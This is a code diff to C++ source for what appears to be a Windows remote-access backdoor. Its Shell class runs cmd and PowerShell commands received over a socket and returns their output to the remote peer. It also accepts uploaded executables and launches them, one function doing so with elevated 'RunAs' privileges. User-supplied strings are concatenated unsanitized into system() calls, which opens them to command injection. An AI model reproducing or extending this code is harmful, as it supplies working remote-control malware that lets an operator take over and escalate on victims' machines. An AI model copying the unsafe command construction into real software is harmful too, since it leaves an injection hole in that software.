@@ -17,7 +17,8 @@ std::string Shell::return_command(const std::string cmd)
 			return_c += line+"\n";
 		}
 		file.close();
-		system("ERASE cmd.tmp");
+		std::string erase = "ERASE " + std::string(FILE_TMP);
+		system(erase.c_str());
 		return return_c;
 	}
 	else
@@ -36,15 +37,25 @@ void Shell::ls(SOCKET* client)
 	std::string ret = return_command("dir /b");
 	send(*client,("\n"+ret).c_str(),BUFFER_LEN,0);
 }
-void Shell::run(SOCKET* client,const std::vector<std::string> args)
+void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 {
 	std::string cmd;
 	for (int iargs = 1; iargs < args.size(); iargs++)
 	{
 		cmd=cmd+args[iargs]+" ";
 	}
-	std::string ret = return_command(cmd).c_str();
-	send(*client, ret.c_str(), sizeof(ret), 0);
+	std::string ret = Shell::return_command(cmd);
+	if (ret != "") { send(*client, ret.c_str(), BUFFER_LEN, 0); }
+}
+void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
+{
+	std::string cmd = "powershell ";
+	for (int iargs = 1; iargs < args.size(); iargs++)
+	{
+		cmd = cmd + args[iargs] + " ";
+	}
+	std::string ret = Shell::return_command(cmd).c_str();
+	if (ret != "") {send(*client, ret.c_str(), BUFFER_LEN, 0); }
 }
 
 void Shell::uploadToClientExe(Client* client, std::string filename)
@@ -52,7 +63,24 @@ void Shell::uploadToClientExe(Client* client, std::string filename)
 	if (Transfer::uploadToClient(client, filename))
 	{
 		client->send_b(std::string("Upload done, now starting " + filename+" ...").c_str());
-		system(std::string("start " + filename).c_str());
+		Shell::exe(client, filename);
 		client->send_b("Done");
 	}
+}
+
+void Shell::exeAdmin(Client* client,const std::string filename)
+{
+	client->send_b(("Starting in admin mode " + filename).c_str());
+	const std::string cmd = "powershell Start-Process " + filename + " -Verb RunAs";
+	std::string ret = Shell::return_command(cmd);
+	if (ret != ""){send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0);}
+	client->send_b("Done");
+}
+void Shell::exe(Client* client, const std::string filename)
+{
+	client->send_b(("Starting " + filename).c_str());
+	const std::string cmd = "start " + filename;
+	std::string ret = Shell::return_command(cmd);
+	if (ret != "") { send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0); }
+	client->send_b("Done");
 }
